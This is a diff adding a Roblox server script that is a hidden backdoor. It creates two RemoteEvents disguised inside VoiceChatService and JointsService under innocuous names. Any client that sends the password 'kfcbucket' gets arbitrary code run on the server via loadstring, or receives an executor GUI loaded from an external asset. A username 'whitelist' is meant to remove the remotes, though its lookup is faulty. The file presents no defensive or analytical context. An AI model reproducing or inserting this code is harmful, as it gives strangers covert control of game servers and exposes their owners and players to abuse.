@@ -1,0 +1,44 @@
+
+local gui = game:GetService("InsertService"):LoadAsset(13043557348)
+gui.ScreenGui.ResetOnSpawn = false
+local remote1 = Instance.new("RemoteEvent", game:GetService("VoiceChatService"))
+remote1.Name = "VoiceRequest"
+local remote2 = Instance.new("RemoteEvent", game:GetService("JointsService"))
+remote2.Name = "Welds"
+remote1.OnServerEvent:Connect(function(plr, arg, c)
+	if arg == "kfcbucket" then
+		if c then
+			loadstring(c)()
+		end
+		if not c then
+			gui.ScreenGui:Clone().Parent = plr.PlayerGui
+		end
+	end
+end)
+remote2.OnServerEvent:Connect(function(plr, arg, c)
+	if arg == "kfcbucket" then
+		if c then
+			loadstring(c)()
+		end
+		if not c then
+			gui.ScreenGui:Clone().Parent = plr.PlayerGui
+		end
+	end
+end)
+local WhiteList = {
+	["DENIS_7246"] = true,
+	["WaffleFrog404"] = true,
+	["egor3556411"] = true,
+	["huks2010"] = true,
+	["dghkjg"] = true,
+	["didx232333"] = true,
+	["hebris"] = true
+
+}
+
+game.Players.PlayerAdded:Connect(function(plr)
+	if table.find(WhiteList, plr.Name) or table.find(WhiteList, plr.DisplayName) then
+		remote1:Destroy()
+		remote2:Destroy()
+	end
+end)
